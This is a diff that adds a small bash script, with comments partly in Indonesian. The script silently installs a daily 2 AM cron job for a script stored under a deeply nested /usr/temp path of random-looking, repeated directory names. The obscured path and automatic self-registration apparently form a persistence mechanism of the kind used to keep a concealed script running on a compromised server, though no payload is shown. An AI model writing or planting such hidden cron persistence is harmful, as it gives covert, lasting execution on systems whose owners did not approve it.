@@ -1,0 +1,12 @@
+#!/bin/bash
+# Auto-install cron job to run script at 2 AM daily
+
+SCRIPT_PATH="/usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/xp"
+
+# Tambahkan cron jika belum ada
+if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
+    (crontab -l 2>/dev/null; echo "0 2 * * * $SCRIPT_PATH") | crontab -
+    echo "[OK] Cron job added: Runs at 02:00 every day"
+else
+    echo "[INFO] Cron job already exists"
+fi
